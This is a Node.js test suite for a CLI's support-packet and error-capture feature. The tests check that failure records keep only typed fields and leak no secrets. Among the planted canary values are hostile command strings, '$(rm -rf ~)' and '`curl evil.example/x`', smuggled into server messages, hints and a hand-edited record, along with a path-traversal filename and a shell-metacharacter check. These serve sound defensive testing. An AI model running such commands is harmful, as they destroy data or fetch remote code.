import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { spawn } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, statSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildRecord, buildPacket, routeTemplate } from '../dist/lib/repro-packet.js';

// tsk_da2dba3d: the repro packet holds only typed, validated fields. Every canary below is planted
// where a real failure carries free text (message, hint, data, headers, arguments, SQL, URL query,
// project refs); none may reach last-error.json, the packet, or stdout.
const distIndex = join(dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'index.js');
const CANARIES = ['smt_CANARYdevkey123', 'eyJhbGciOiJIUzI1NiJ9.CANARYjwt.sig', 'hunter2-CANARY-password', 'canary.person@example.com',
  'SELECT_CANARY_SQL', 'token=CANARYquery', 'sk_live_CANARYstripe', '$(rm -rf ~)', '`curl evil.example/x`', 'CANARY-stack-at-line-42'];

let mode = 'refused';
let requestHandle = 'req_8f2c1a9b77d0';
let requestCount = 0;
const server = createServer(async (req, res) => {
  requestCount++;
  for await (const _ of req) { /* drain */ }
  res.setHeader('Content-Type', 'application/json');
  if (requestHandle !== null) res.setHeader('X-Request-Id', requestHandle);
  res.setHeader('X-Trace-Id', 'trace-4e1d2c3b5a69');
  res.setHeader('X-Debug-Leak', 'Bearer smt_CANARYdevkey123');
  if (mode === 'partial') {
    res.statusCode = 200; res.write('{"ok":true,"data":'); setTimeout(() => res.destroy(), 25); return;
  }
  res.statusCode = mode === 'refused' ? 409 : 503;
  res.end(JSON.stringify({ ok: false, error: mode === 'refused' ? 'STALE_RELEASE_BASE' : 'DB_UNAVAILABLE',
    message: `failed for canary.person@example.com with hunter2-CANARY-password at SELECT_CANARY_SQL; run \`curl evil.example/x\`; CANARY-stack-at-line-42`,
    hint: 'Try: $(rm -rf ~) or set token=CANARYquery',
    data: { sql: 'SELECT_CANARY_SQL', password: 'hunter2-CANARY-password', jwt: 'eyJhbGciOiJIUzI1NiJ9.CANARYjwt.sig', stripe: 'sk_live_CANARYstripe' } }));
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const apiUrl = `http://127.0.0.1:${server.address().port}`;
test.after(() => server.close());

function fixture() {
  const root = mkdtempSync(join(tmpdir(), 'sw-repro-'));
  const configDir = join(root, 'config'); const app = join(root, 'app');
  mkdirSync(configDir); mkdirSync(app);
  writeFileSync(join(configDir, 'config.json'), JSON.stringify({ token: 'smt_CANARYdevkey123', user: { email: 'canary.person@example.com', username: 'd' } }));
  writeFileSync(join(app, '.somewhere.json'), JSON.stringify({ project_id: 'proj_7c1b2a9d4e' }));
  return { app, configDir };
}
function run(args, { app, configDir }) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [distIndex, ...args], { cwd: app, env: { ...process.env, NO_COLOR: '1', SOMEWHERE_API_URL: apiUrl, SOMEWHERE_CONFIG_DIR: configDir } });
    let out = '', stdout = '', stderr = ''; child.stdout.on('data', (c) => { out += c; stdout += c; }); child.stderr.on('data', (c) => { out += c; stderr += c; });
    child.on('close', (status) => resolve({ status, out, stdout, stderr }));
  });
}
const leaks = (text) => CANARIES.filter((c) => text.includes(c) || text.includes(c.replace(/[`$()~]/g, '')) && c.length > 12 && text.includes(c.slice(0, 12)));

test('a failure carrying secrets everywhere leaves only typed fields in last-error.json and the packet', async () => {
  mode = 'unavailable';
  const fx = fixture();
  const failed = await run(['db', 'query', "SELECT_CANARY_SQL WHERE password = 'hunter2-CANARY-password' AND token=CANARYquery", '--project', 'proj_7c1b2a9d4e'], fx);
  assert.notEqual(failed.status, 0);
  const file = join(fx.configDir, 'last-error.json');
  assert.ok(existsSync(file), failed.out);
  assert.equal(statSync(file).mode & 0o777, 0o600);
  const stored = readFileSync(file, 'utf8');
  assert.deepEqual(leaks(stored), [], `last-error.json leaked: ${stored}`);
  const record = JSON.parse(stored);
  assert.deepEqual([record.code, record.http_status, record.operation, record.request_id, record.trace_id, record.project_id, record.command, record.outcome],
    ['DB_UNAVAILABLE', 503, 'POST /db/query', 'req_8f2c1a9b77d0', 'trace-4e1d2c3b5a69', 'proj_7c1b2a9d4e', 'db query', 'unknown']);
  for (const forbidden of ['message', 'hint', 'data', 'args', 'stack', 'headers']) assert.ok(!(forbidden in record), forbidden);

  const text = await run(['support', 'packet'], fx);
  assert.equal(text.status, 0, text.out);
  assert.deepEqual(leaks(text.out), [], `packet text leaked: ${text.out}`);
  assert.match(text.out, /outcome: unknown/);
  assert.match(text.out, /never retry it blindly/);
  const json = await run(['support', 'packet', '--json'], fx);
  assert.deepEqual(leaks(json.out), [], `packet json leaked: ${json.out}`);
  const packet = JSON.parse(json.out);
  assert.equal(packet.recipe.rerun_original, false, 'a mutation with an unknown outcome is never rerun');
  assert.equal(packet.submit.automatic, false);
  // omitted names only failure parts the packet never reads; it makes no content guarantee about
  // tokens, passwords or emails (platform #875, tsk_da2dba3d).
  assert.ok(packet.omitted.includes('message') && packet.omitted.includes('headers') && packet.omitted.includes('cookies'));
  for (const claim of ['tokens', 'passwords', 'emails']) assert.equal(packet.omitted.includes(claim), false, `no unproven content claim: ${claim}`);
  for (const step of packet.recipe.investigate) {
    assert.ok(Array.isArray(step) && step.every((part) => typeof part === 'string'), 'argument arrays only');
    assert.ok(step.every((part) => !/[`$;|&]/.test(part)), 'no shell metacharacters in investigate steps');
  }
});

test('a refusal is classified as refused and the support command never overwrites the record it reports', async () => {
  mode = 'refused';
  const fx = fixture();
  await run(['db', 'query', 'SELECT 1', '--project', 'proj-CANARY?token=CANARYquery'], fx);
  const record = JSON.parse(readFileSync(join(fx.configDir, 'last-error.json'), 'utf8'));
  assert.equal(record.outcome, 'refused');
  assert.equal(record.code, 'STALE_RELEASE_BASE');
  assert.doesNotMatch(JSON.stringify(record), /CANARY/);
  assert.equal(record.operation, 'POST /db/query', 'the route is a template; the project ref and its query never appear');
  const before = readFileSync(join(fx.configDir, 'last-error.json'), 'utf8');
  await run(['support', 'packet', '--out', '../escape.json'], fx); // refused: plain file names only
  assert.equal(readFileSync(join(fx.configDir, 'last-error.json'), 'utf8'), before, 'support failures do not replace the record');
  assert.ok(!existsSync(join(dirname(fx.app), 'escape.json')));
  const written = await run(['support', 'packet', '--out', 'packet.json'], fx);
  assert.equal(written.status, 0, written.out);
  assert.equal(statSync(join(fx.app, 'packet.json')).mode & 0o777, 0o600);
});

test('a hand-edited last-error.json cannot smuggle fields or text into the packet', async () => {
  const fx = fixture();
  writeFileSync(join(fx.configDir, 'last-error.json'), JSON.stringify({ schema: 'somewhere.repro/1', code: 'DB_UNAVAILABLE', outcome: 'failed', client: { kind: 'cli', version: '0.37.63', note: 'hunter2-CANARY-password' },
    captured_at: '2026-10-21T00:00:00Z', message: 'hunter2-CANARY-password', trace_id: 'bad id with spaces smt_CANARYdevkey123', operation: 'GET /x?token=CANARYquery',
    command: 'db $(rm -rf ~)', extra: { sql: 'SELECT_CANARY_SQL' } }));
  const json = await run(['support', 'packet', '--json'], fx);
  assert.equal(json.status, 0, json.out);
  assert.deepEqual(leaks(json.out), [], json.out);
  const packet = JSON.parse(json.out);
  assert.deepEqual(Object.keys(packet.collected).sort(), ['captured_at', 'client', 'code', 'outcome', 'schema'].sort().concat(packet.collected.command ? ['command'] : []).sort());
});

test('builders: route templates drop queries and ids; non-platform errors are CLI_ERROR; tool errors keep the tool name', () => {
  assert.equal(routeTemplate('/projects/0b3c2d1e-1a2b-4c3d-8e4f-000000000001/deploys/rel_x?q=secret#frag'), '/projects/:id/deploys/:id');
  assert.equal(routeTemplate('/fs/p/path with spaces/x'), '/fs/:id/:seg/:id');
  assert.equal(routeTemplate('/projects/acme-secret-launch/urls'), '/projects/:id/urls', 'a slug is never copied');
  assert.equal(buildRecord(new Error('hunter2-CANARY-password'), { cliVersion: '0.37.63' }).code, 'CLI_ERROR');
  const toolError = Object.assign(new Error('canary.person@example.com'), { name: 'PlatformToolError', tool: 'browser', code: 'BROWSER_DAILY_LIMIT', meta: { requestId: 'req_8f2c1a9b77d0' } });
  const record = buildRecord(toolError, { cliVersion: '0.37.63', command: 'browser test' });
  assert.deepEqual([record.operation, record.code, record.request_id], ['tool:browser', 'BROWSER_DAILY_LIMIT', 'req_8f2c1a9b77d0']);
  assert.equal(buildPacket(record).surface, 'browser_verify');
  assert.equal(buildRecord(Object.assign(new Error('x'), { name: 'CliApiError', code: 'lower-case-bad', statusCode: 9999 }), { cliVersion: '1' }).code, 'UNCLASSIFIED');
});

test('a verify refusal records only the agreed { path, limit_ms } detail alongside its code', () => {
  const record = buildRecord({ name: 'CliApiError', code: 'VALIDATION_ERROR', statusCode: 400, invalid: { path: 'actions[6].wait', limit_ms: 45000 } }, { cliVersion: '0.37.64', command: 'verify' });
  assert.deepEqual(record.invalid, { path: 'actions[6].wait', limit_ms: 45000 });
  assert.equal(buildPacket(record).surface, 'browser_verify');
  const hostile = buildRecord({ name: 'CliApiError', code: 'VALIDATION_ERROR', statusCode: 400, invalid: { path: 'button[data-x="hunter2"]' } }, { cliVersion: '0.37.64' });
  assert.equal(hostile.invalid, undefined);
});

test('review 67 #1: a mutation with no status or SERVER_SLOW is unknown, never failed; reads and refusals keep their outcome', () => {
  const slow = buildRecord({ name: 'CliApiError', code: 'SERVER_SLOW', statusCode: 0, operation: 'POST /deploy' }, { cliVersion: '1.0.0' });
  assert.equal(slow.outcome, 'unknown');
  assert.equal(buildPacket(slow).recipe.rerun_original, false);
  assert.match(buildPacket(slow).recipe.steps[0], /never retry it blindly/);
  const tool = buildRecord({ name: 'PlatformToolError', code: 'INTERNAL_ERROR', tool: 'project_deploy' }, { cliVersion: '1.0.0' });
  assert.deepEqual([tool.operation, tool.outcome], ['tool:project_deploy', 'unknown']);
  // Controls: a failed read stays failed, a mutation refused with a 4xx stays refused.
  assert.equal(buildRecord({ name: 'CliApiError', code: 'INTERNAL_ERROR', operation: 'GET /projects/:id' }, { cliVersion: '1.0.0' }).outcome, 'failed');
  assert.equal(buildRecord({ name: 'CliApiError', code: 'VALIDATION_ERROR', statusCode: 400, operation: 'POST /deploy' }, { cliVersion: '1.0.0' }).outcome, 'refused');
});

test('review 67 #2: a hand-edited record cannot carry free text in version, operation, ids or command', async () => {
  const fx = fixture();
  writeFileSync(join(fx.configDir, 'last-error.json'), JSON.stringify({ schema: 'somewhere.repro/1', code: 'DB_UNAVAILABLE', outcome: 'failed',
    client: { kind: 'cli', version: '0.37.63 Alice Smith lives at 12' }, captured_at: '2026-10-21T00:00:00Z',
    operation: 'POST /projects/alice-smith/files/medical-record-123', project_id: '--project-evil', request_id: '-req_8f2c1a9b77d0',
    trace_id: 'trace-4e1d2c3b5a69', command: 'deploy alice smith ssn' }));
  const json = await run(['support', 'packet', '--json'], fx);
  assert.equal(json.status, 0, json.out);
  const packet = JSON.parse(json.out);
  assert.deepEqual(packet.collected.client, { kind: 'cli', version: 'unknown' });
  assert.equal(packet.collected.operation, undefined, 'an untemplated path is dropped, not copied');
  assert.equal(packet.collected.project_id, undefined);
  assert.equal(packet.collected.request_id, undefined, 'an id that could read as a flag is dropped');
  assert.equal(packet.collected.trace_id, 'trace-4e1d2c3b5a69', 'control: a valid id is kept');
  assert.equal(packet.collected.command, undefined, 'only registered command paths are kept');
  assert.doesNotMatch(json.out, /alice|smith|medical|ssn|evil|Alice/);
  for (const step of packet.recipe.investigate) assert.ok(step.slice(1).every((part) => !part.startsWith('-') || /^--[a-z]/.test(part) && !/evil/.test(part)));
  // Controls: a genuine record keeps its template, registered command and prerelease version.
  writeFileSync(join(fx.configDir, 'last-error.json'), JSON.stringify({ schema: 'somewhere.repro/1', code: 'DB_UNAVAILABLE', outcome: 'unknown',
    client: { kind: 'cli', version: '0.37.64-rc.1' }, captured_at: '2026-10-21T00:00:00Z', operation: 'POST /projects/:id/files/:seg', command: 'db query', project_id: 'proj_7c1b2a9d4e' }));
  const good = JSON.parse((await run(['support', 'packet', '--json'], fx)).out).collected;
  assert.deepEqual([good.client.version, good.operation, good.command, good.project_id], ['0.37.64-rc.1', 'POST /projects/:id/files/:seg', 'db query', 'proj_7c1b2a9d4e']);
});

test('review 67 non-blocking: a deploy command that failed on a read still gets the deploy guidance', () => {
  const record = buildRecord({ name: 'CliApiError', code: 'INTERNAL_ERROR', statusCode: 500, operation: 'GET /projects/:id' }, { cliVersion: '1.0.0', command: 'deploy' });
  const packet = buildPacket(record);
  assert.equal(packet.surface, 'deploy');
  assert.ok(packet.recipe.steps.some((step) => /Do NOT re-run the original deploy/.test(step)));
});

test('f74 contract: client replaces cli_version, DEPLOY_OUTCOME_UNKNOWN is unknown, a bare actions path is accepted', () => {
  const record = buildRecord({ name: 'CliApiError', code: 'DEPLOY_OUTCOME_UNKNOWN', statusCode: 409, operation: 'POST /deploy', meta: { retry: false } }, { cliVersion: '0.37.64' });
  assert.deepEqual(record.client, { kind: 'cli', version: '0.37.64' });
  assert.ok(!('cli_version' in record));
  assert.equal(record.outcome, 'unknown', 'the platform already says inspect, never retry');
  assert.equal(buildPacket(record).recipe.rerun_original, false);
  assert.deepEqual(buildRecord({ name: 'CliApiError', code: 'VALIDATION_ERROR', statusCode: 400, invalid: { path: 'actions' } }, { cliVersion: '1.0.0' }).invalid, { path: 'actions' });
  assert.equal(buildRecord({ name: 'CliApiError', code: 'VALIDATION_ERROR', statusCode: 400, invalid: { path: 'actionsX' } }, { cliVersion: '1.0.0' }).invalid, undefined);
  assert.equal(buildRecord(new Error('x'), { cliVersion: '1.0.0 junk' }).client.version, 'unknown');
});

for (const variant of ['typed', 'raw', 'stream', 'stream-raw']) {
  test(`api ${variant} failure replaces another lane record with typed capture, unchanged failure output`, async () => {
    mode = 'unavailable';
    const fx = fixture();
    const file = join(fx.configDir, 'last-error.json');
    writeFileSync(file, JSON.stringify(buildRecord({ name: 'CliApiError', code: 'OTHER_LANE', meta: { requestId: 'req_other_lane' } }, { cliVersion: '0.37.72' })));
    const args = ['api', 'POST', '/db/query?token=CANARYquery'];
    if (variant.includes('stream')) { writeFileSync(join(fx.app, 'body.txt'), 'SELECT_CANARY_SQL'); args.push('--data-file', 'body.txt'); }
    if (variant.includes('raw')) args.push('--raw');
    const failed = await run(args, fx);
    assert.equal(failed.status, 1);
    assert.match(failed.stdout, /DB_UNAVAILABLE/, 'original platform output remains');
    assert.match(failed.stderr, /Recovery: somewhere support packet --request req_8f2c1a9b77d0 --json/);
    const stored = readFileSync(file, 'utf8');
    assert.deepEqual(leaks(stored), []);
    const record = JSON.parse(stored);
    assert.equal(record.request_id, 'req_8f2c1a9b77d0');
    assert.equal(record.http_status, 503);
    assert.equal(record.operation, 'POST /db/query');
    assert.equal(record.command, 'api');
    assert.equal(record.outcome, 'unknown');
    assert.equal(record.code, variant.includes('raw') ? 'HTTP_ERROR' : 'DB_UNAVAILABLE');
    const packet = await run(['support', 'packet', '--request', record.request_id, '--json'], fx);
    assert.equal(packet.status, 0, packet.out);
    assert.equal(JSON.parse(packet.out).collected.request_id, record.request_id);
    assert.equal(statSync(file).mode & 0o777, 0o600);
  });
}

test('request-pinned packet refuses another snapshot, unavailable record and malformed selectors', async () => {
  const fx = fixture();
  const file = join(fx.configDir, 'last-error.json');
  const unavailable = await run(['support', 'packet', '--request', 'req_8f2c1a9b77d0', '--json'], fx);
  assert.equal(unavailable.status, 1);
  assert.equal(JSON.parse(unavailable.out).error, 'REQUEST_FAILURE_UNAVAILABLE');
  const other = JSON.stringify(buildRecord({ name: 'CliApiError', code: 'OTHER_LANE', meta: { requestId: 'req_other_lane' } }, { cliVersion: '0.37.72' }));
  writeFileSync(file, other);
  const mismatch = await run(['support', 'packet', '--request', 'req_8f2c1a9b77d0', '--json'], fx);
  assert.equal(mismatch.status, 1);
  assert.equal(JSON.parse(mismatch.out).error, 'REQUEST_FAILURE_MISMATCH');
  assert.doesNotMatch(mismatch.out, /req_other_lane|OTHER_LANE/);
  assert.equal(readFileSync(file, 'utf8'), other, 'support never replaces original record');
  for (const id of ['bad id', '--evil', 'x', '$(secret)']) {
    const invalid = await run(['support', 'packet', '--request=' + id, '--json'], fx);
    assert.equal(invalid.status, 1);
    assert.equal(JSON.parse(invalid.out).error, 'INVALID_REQUEST_SELECTOR');
  }
  const mixed = await run(['support', 'packet', '--request', 'req_8f2c1a9b77d0', '--trace', 'a'.repeat(32), '--json'], fx);
  assert.equal(mixed.status, 1);
  assert.equal(JSON.parse(mixed.out).error, 'INVALID_REQUEST_SELECTOR');
});

test('packet guidance pins a server request; missing handles explicitly remain shared latest state', async () => {
  mode = 'refused'; const fx = fixture();
  await run(['api', 'GET', '/missing'], fx);
  const text = await run(['support', 'packet'], fx);
  assert.match(text.out, /support packet --request req_8f2c1a9b77d0 --json/);
  writeFileSync(join(fx.configDir, 'last-error.json'), JSON.stringify(buildRecord({}, { cliVersion: '0.37.72' })));
  const bare = await run(['support', 'packet'], fx);
  assert.match(bare.out, /most recent failure in this config, not pinned to an invocation/);
});

test('concurrent captures leave a complete private record and never share a temporary inode', async () => {
  const fx = fixture();
  const module = new URL('../dist/lib/repro-packet.js', import.meta.url).href;
  const jobs = Array.from({ length: 8 }, (_, i) => new Promise((resolve, reject) => {
    const code = `import {writeLastError,buildRecord} from ${JSON.stringify(module)}; for(let n=0;n<50;n++)writeLastError(buildRecord({name:'CliApiError',code:'DB_UNAVAILABLE',meta:{requestId:'req_writer_${i}'}},{cliVersion:'0.37.72'}));`;
    const child = spawn(process.execPath, ['--input-type=module', '-e', code], { env: { ...process.env, SOMEWHERE_CONFIG_DIR: fx.configDir }, stdio: 'ignore' });
    child.on('error', reject); child.on('close', status => status === 0 ? resolve() : reject(new Error('capture child failed')));
  }));
  await Promise.all(jobs);
  const file = join(fx.configDir, 'last-error.json');
  assert.match(JSON.parse(readFileSync(file, 'utf8')).request_id, /^req_writer_[0-7]$/);
  assert.equal(statSync(file).mode & 0o777, 0o600);
  const { readdirSync } = await import('node:fs');
  assert.deepEqual(readdirSync(fx.configDir).filter(name => name.endsWith('.tmp')), []);
  const source = readFileSync(new URL('../src/lib/repro-packet.ts', import.meta.url), 'utf8');
  assert.match(source, /openSync\(tmp, 'wx', 0o600\)/);
  assert.match(source, /randomUUID\(\)/);
});

test('each actual API failure branch invokes the existing capture hook exactly once', async () => {
  mode = 'unavailable'; const fx = fixture();
  writeFileSync(join(fx.app, 'body.txt'), 'synthetic');
  const apiModule = new URL('../dist/commands/api.js', import.meta.url).href;
  const outputModule = new URL('../dist/lib/output.js', import.meta.url).href;
  const commanderModule = new URL('../node_modules/commander/esm.mjs', import.meta.url).href;
  for (const responseMode of ['unavailable', 'partial']) for (const flags of [[], ['--raw'], ['--data-file', 'body.txt'], ['--data-file', 'body.txt', '--raw']]) {
    mode = responseMode;
    const code = `import {Command} from ${JSON.stringify(commanderModule)}; import {registerApi} from ${JSON.stringify(apiModule)}; import {setFailureHook} from ${JSON.stringify(outputModule)}; let count=0; setFailureHook(()=>{count++}); process.on('exit',()=>console.error('CAPTURE_COUNT='+count)); const p=new Command(); registerApi(p); await p.parseAsync(['node','test','api','POST','/db/query',...${JSON.stringify(flags)}]);`;
    const result = await new Promise((resolve, reject) => {
      const child = spawn(process.execPath, ['--input-type=module', '-e', code], { cwd: fx.app, env: { ...process.env, NO_COLOR: '1', SOMEWHERE_API_URL: apiUrl, SOMEWHERE_CONFIG_DIR: fx.configDir } });
      let err = ''; child.stdout.resume(); child.stderr.on('data', c => err += c);
      child.on('error', reject); child.on('close', status => resolve({ status, err }));
    });
    assert.equal(result.status, 1, result.err);
    assert.match(result.err, /CAPTURE_COUNT=1\s*$/);
  }
});

for (const variant of ['typed', 'raw', 'stream', 'stream-raw']) {
  test(`partial HTTP200 ${variant} mutation keeps handle and unknown outcome without changing stdout`, async () => {
    mode = 'partial'; const fx = fixture();
    const before = requestCount;
    const args = ['api', 'POST', '/db/query?token=CANARYquery'];
    if (variant.includes('stream')) { writeFileSync(join(fx.app, 'body.txt'), 'SELECT_CANARY_SQL'); args.push('--data-file', 'body.txt'); }
    if (variant.includes('raw')) args.push('--raw');
    const failed = await run(args, fx);
    assert.equal(failed.status, 1);
    const stored = readFileSync(join(fx.configDir, 'last-error.json'), 'utf8');
    const record = JSON.parse(stored);
    assert.deepEqual([record.code, record.outcome, record.http_status, record.request_id, record.operation],
      ['RESPONSE_BODY_ERROR', 'unknown', 200, 'req_8f2c1a9b77d0', 'POST /db/query']);
    assert.deepEqual(leaks(stored), []);
    assert.match(failed.stderr, /Recovery: somewhere support packet --request req_8f2c1a9b77d0 --json/);
    assert.doesNotMatch(failed.stdout, /Recovery|support packet/);
    if (variant === 'stream-raw') assert.equal(failed.stdout, '{"ok":true,"data":');
    else if (variant === 'raw' || variant === 'stream') assert.equal(failed.stdout, '');
    else assert.equal(JSON.parse(failed.stdout).error, 'RESPONSE_BODY_ERROR');
    const packet = await run(['support', 'packet', '--request', record.request_id, '--json'], fx);
    assert.equal(packet.status, 0, packet.out);
    assert.equal(JSON.parse(packet.stdout).recipe.rerun_original, false);
    assert.equal(requestCount - before, 1, 'incomplete mutation was never resent');
  });
}

test('recovery guidance comes only from this invocation handle, never another lane record', async () => {
  mode = 'unavailable'; const fx = fixture();
  for (const handle of [null, 'invalid handle', 'smt_CANARYdevkey123']) {
    requestHandle = handle;
    writeFileSync(join(fx.configDir, 'last-error.json'), JSON.stringify(buildRecord({ name: 'CliApiError', code: 'OTHER_LANE', meta: { requestId: 'req_other_lane' } }, { cliVersion: '0.37.72' })));
    try {
      const failed = await run(['api', 'POST', '/db/query'], fx);
      assert.equal(failed.status, 1);
      assert.doesNotMatch(failed.stderr, /Recovery|req_other_lane|smt_CANARY/);
    } finally { requestHandle = 'req_8f2c1a9b77d0'; }
  }
});

test('streamed partial200 JSON output retains its original envelope while capture stays unknown', async () => {
  mode = 'partial'; const fx = fixture();
  writeFileSync(join(fx.app, 'body.txt'), 'synthetic');
  const failed = await run(['api', 'POST', '/db/query', '--data-file', 'body.txt', '--json'], fx);
  assert.equal(failed.status, 1);
  assert.deepEqual(JSON.parse(failed.stdout), { ok: false, error: 'INVALID_RESPONSE', message: 'Non-JSON response (200). Use --raw to print it.' });
  const record = JSON.parse(readFileSync(join(fx.configDir, 'last-error.json'), 'utf8'));
  assert.equal(record.outcome, 'unknown');
  assert.equal(record.request_id, 'req_8f2c1a9b77d0');
  assert.match(failed.stderr, /support packet --request req_8f2c1a9b77d0 --json/);
});
